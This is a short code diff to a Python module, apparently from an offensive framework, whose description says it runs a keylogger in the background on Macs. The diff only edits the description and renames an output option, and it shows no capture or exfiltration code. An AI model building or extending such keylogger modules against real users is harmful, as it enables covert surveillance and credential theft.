@@ -9,7 +9,7 @@ class Module(ModuleABC):
     def get_info(self):
         return {
             "Author:": ["pand3mic"],
-            "Description": "Runs a keylogger in the background.",
+            "Description": "Runs a keylogger in the background for Macs.",
             "References": [],
             # Should Stoppable be set to true or false?
             "Stoppable": False
@@ -21,8 +21,8 @@ class Module(ModuleABC):
         ]
 
     def setup(self, set_options):
-        output_file = set_options[1]
+        output_dir = set_options[1]
 
         return True, {
-            "output_file": output_file
+            "output_dir": output_dir
         }
